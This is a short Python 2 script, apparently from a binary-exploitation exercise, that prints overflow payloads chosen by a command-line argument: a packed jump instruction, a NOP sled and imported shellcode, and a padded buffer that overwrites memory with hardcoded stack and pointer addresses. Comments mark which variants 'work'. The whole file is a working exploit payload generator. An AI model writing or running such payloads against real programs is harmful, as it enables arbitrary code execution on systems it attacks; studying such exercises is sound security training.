#! python code
import sys
from shellcode import shellcode

from struct import pack

if sys.argv[1] == '1':
#	print "A"*32
#working#	print  pack('<I',0xeb819090)+ "\x90"*4 + shellcode
	print  pack('<I',0x909006EB)+ "\x90"*4 + shellcode #works as well with better jump command
#	print  pack('<I',0x909006EB)+ "\x90"*4 + p
#	print p
elif sys.argv[1] == '2':
#	print "B"*40 + pack('<I',0xbffee788) + pack('<I', 0x80f3720)
	print "B"*40 + pack('<I', 0x80f3720) +  pack('<I',0xbffee78c)
elif sys.argv[1] == '3':
#	print pack('<I',0x90909090) + shellcode
	print "C"*32
else:
	print "no option"
